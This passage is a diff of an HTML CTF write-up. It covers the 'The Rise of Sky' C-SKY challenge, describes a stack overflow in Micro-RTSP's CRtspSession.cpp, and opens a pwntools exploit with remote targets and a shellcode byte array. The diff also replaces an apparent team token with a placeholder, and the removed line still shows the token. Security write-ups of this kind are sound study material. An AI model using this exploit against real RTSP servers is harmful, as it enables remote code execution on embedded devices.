@@ -531,7 +531,7 @@ qiling是基于unicorn的实现的二进制程序执行环境，自己实现了s
 
 }</code></pre><h3 id="the-rise-of-sky"><a class="header-link" href="#the-rise-of-sky"></a>The Rise of Sky</h3>
 <p>Strange arch(c-sky) pwn.
-Stack overlow at <a href="https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65">https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65</a> No PIE, No NX, ret to data</p>
+Stack overflow at <a href="https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65">https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65</a> No PIE, No NX, ret to data</p>
 <pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 
 debug = <span class="hljs-number">0</span>
@@ -542,7 +542,7 @@ base = <span class="hljs-number">0x13f510</span>
     p = remote(<span class="hljs-string">&#x27;192.168.101.23&#x27;</span>, <span class="hljs-number">8554</span>)
 <span class="hljs-keyword">else</span>:
     p = remote(<span class="hljs-string">&#x27;47.242.246.203&#x27;</span>, <span class="hljs-number">32042</span>)
-<span class="hljs-comment">#    p.sendlineafter(&#x27;:&#x27;, &#x27;jFtAt3QdTzm8W1qjMz+Oaw==&#x27;)</span>
+<span class="hljs-comment">#    p.sendlineafter(&#x27;:&#x27;, &#x27;{Team_token}&#x27;)</span>
 
 sc = [
     <span class="hljs-number">0x23</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x16</span>,
